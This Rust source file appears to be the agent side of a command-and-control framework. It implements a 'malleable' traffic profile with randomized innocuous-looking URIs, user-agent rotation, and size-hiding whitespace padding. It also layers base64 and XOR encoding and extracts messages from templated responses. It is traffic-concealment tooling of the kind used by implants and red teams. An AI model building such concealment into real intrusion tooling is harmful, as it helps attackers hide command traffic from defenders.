// Malleable traffic profile (shared/protocol/profile.go). The agent must
// generate the same request shapes the Go listener accepts and recover the
// envelope from templated responses.
use base64::Engine;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};

use crate::envelope::Envelope;

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct KV {
    #[serde(default)]
    pub key: String,
    #[serde(default)]
    pub value: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct ResponseProfile {
    #[serde(default)]
    pub status: u16,
    #[serde(default)]
    pub content_type: String,
    #[serde(default)]
    pub body: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Profile {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub uris: Vec<String>,
    #[serde(default)]
    pub method: String,
    #[serde(default)]
    pub host: String,
    #[serde(default)]
    pub ua_pool: Vec<String>,
    #[serde(default)]
    pub headers: Vec<KV>,
    #[serde(default)]
    pub data: String,
    #[serde(default)]
    pub data_transform: Vec<String>,
    #[serde(default)]
    pub pad_block: i64,
    #[serde(default)]
    pub zstd: bool,
    #[serde(default)]
    pub response: ResponseProfile,
    #[serde(default)]
    pub not_found: ResponseProfile,
    #[serde(default)]
    pub sleep_ms: i64,
    #[serde(default)]
    pub jitter_pct: i64,
}

impl Profile {
    pub fn generic() -> Self {
        Self {
            name: "generic".into(),
            uris: vec!["/submit".into()],
            method: "POST".into(),
            data: "body".into(),
            ..Default::default()
        }
    }

    pub fn finalize(&mut self) {
        if self.uris.is_empty() {
            self.uris = vec!["/submit".into()];
        }
        if self.method.is_empty() {
            self.method = "POST".into();
        }
        if self.data.is_empty() {
            self.data = "body".into();
        }
        if self.response.body.is_empty() {
            self.response.body = "{data}".into();
        }
    }

    pub fn raw_response(&self) -> bool {
        self.response.body.is_empty() || self.response.body == "{data}"
    }

    pub fn pick_uri(&self) -> String {
        let mut rng = rand::thread_rng();
        let tmpl = if self.uris.len() > 1 {
            &self.uris[rng.gen_range(0..self.uris.len())]
        } else {
            &self.uris[0]
        };
        let mut out = tmpl
            .replace("{uuid}", &random_hex(8))
            .replace("{ts}", &now_secs().to_string());
        out = out.replace("{n}", &rng.gen_range(0..u32::MAX).to_string());
        out
    }

    pub fn pick_ua(&self) -> String {
        if self.ua_pool.is_empty() {
            return String::new();
        }
        let mut rng = rand::thread_rng();
        self.ua_pool[rng.gen_range(0..self.ua_pool.len())].clone()
    }

    // pad_envelope mirrors protocol.Profile.PadEnvelope (plan P6): trailing JSON
// whitespace is invisible to ReadEnvelope but hides the exact payload size.
pub fn pad_envelope(&self, env: &[u8]) -> Vec<u8> {
    let block = self.pad_block;
    if block < 64 || env.is_empty() {
        return env.to_vec();
    }
    let n = ((env.len() as u64 + block as u64 - 1) / block as u64 * block as u64) as usize;
    let mut out = vec![b' '; n];
    out[..env.len()].copy_from_slice(env);
    out
}

pub fn parse_response(&self, body: &[u8]) -> Result<Envelope, String> {
        if self.raw_response() {
            return serde_json::from_slice(body).map_err(|e| format!("envelope: {e}"));
        }
        // Template output: the envelope is a quoted base64 token somewhere in
        // the body; try every quoted token and accept the first valid one.
        for tok in quoted_tokens(body) {
            let decoded = base64::engine::general_purpose::STANDARD
                .decode(tok)
                .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(tok));
            if let Ok(raw) = decoded {
                if let Ok(env) = serde_json::from_slice::<Envelope>(&raw) {
                    if env.v == 2 {
                        return Ok(env);
                    }
                }
            }
        }
        Err("profile: no envelope found in response template".into())
    }

    // encode_data mirrors protocol.Profile.EncodeData (shared/protocol/profile.go):
    // ordered pipeline base64 | base64url | xor[:NN] | prepend | append | terminate.
    pub fn encode_data(&self, envelope: &[u8]) -> Result<Vec<u8>, String> {
        let mut out = envelope.to_vec();
        for tr in &self.data_transform {
            let (name, arg) = tr.split_once(':').unwrap_or((tr.as_str(), ""));
            match name {
                "base64" => {
                    out = base64::engine::general_purpose::STANDARD.encode(&out).into_bytes()
                }
                "base64url" => {
                    out = base64::engine::general_purpose::URL_SAFE_NO_PAD
                        .encode(&out)
                        .into_bytes()
                }
                "xor" => {
                    let key: u8 = if arg.is_empty() {
                        0xff
                    } else {
                        u8::from_str_radix(arg.trim_start_matches("0x"), 16)
                            .map_err(|_| format!("profile: xor key {arg}"))?
                    };
                    for b in out.iter_mut() {
                        *b ^= key;
                    }
                }
                "prepend" => {
                    let mut v = arg.as_bytes().to_vec();
                    v.extend_from_slice(&out);
                    out = v;
                }
                "append" | "terminate" => out.extend_from_slice(arg.as_bytes()),
                other => return Err(format!("profile: unknown transform {other}")),
            }
        }
        Ok(out)
    }
}

pub fn random_hex(n: usize) -> String {
    let mut b = vec![0u8; n];
    rand::thread_rng().fill(&mut b[..]);
    hex::encode(b)
}

pub fn now_secs() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

fn quoted_tokens(body: &[u8]) -> Vec<&str> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < body.len() {
        if body[i] == b'"' {
            let start = i + 1;
            if let Some(rel) = body[start..].iter().position(|&b| b == b'"') {
                if rel > 0 {
                    if let Ok(s) = std::str::from_utf8(&body[start..start + rel]) {
                        if s.len() >= 8 && s.bytes().all(|b| b.is_ascii_alphanumeric() || b"+/=-_".contains(&b)) {
                            out.push(s);
                        }
                    }
                }
                i = start + rel + 1;
                continue;
            }
        }
        i += 1;
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn placeholder_paths_are_rendered() {
        let p = Profile {
            uris: vec!["/repos/{uuid}/events/{n}".into()],
            ..Profile::generic()
        };
        let uri = p.pick_uri();
        assert!(uri.starts_with("/repos/"));
        assert!(!uri.contains('{'));
    }

    #[test]
    fn templated_response_yields_envelope() {
        let env = Envelope::plain("pubkey", "", serde_json::json!({"pem": "x"}));
        let b64 = base64::engine::general_purpose::STANDARD.encode(env.marshal());
        let p = Profile {
            response: ResponseProfile { body: format!("{{ \"data\": \"{b64}\" }}"), ..Default::default() },
            ..Profile::generic()
        };
        let parsed = p.parse_response(format!("{{ \"data\": \"{b64}\" }}").as_bytes()).unwrap();
        assert_eq!(parsed.t, "pubkey");
    }
}
